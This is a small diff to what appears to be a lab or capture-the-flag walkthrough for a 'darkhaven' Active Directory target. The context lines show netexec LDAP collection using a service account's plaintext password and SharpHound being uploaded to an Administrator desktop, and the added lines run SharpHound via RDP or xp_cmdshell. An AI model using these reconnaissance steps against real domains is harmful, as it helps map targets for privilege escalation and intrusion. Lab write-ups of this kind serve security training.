@@ -195,3 +195,9 @@ nxc ldap dc.ext.darkhaven.local -u 'sql_svc' -p 'SqLS3rvic3!' --bloodhound -coll
 upload /home/tyler/hacksmarter/darkhaven/Sharphound.exe C:/Users/Administrator/Desktop
 ```
 
+**Go to that directory in windows using rdp (or xp_cmdshell) and then run sharphound**
+```python
+.\SharpHound.exe All
+```
+
+
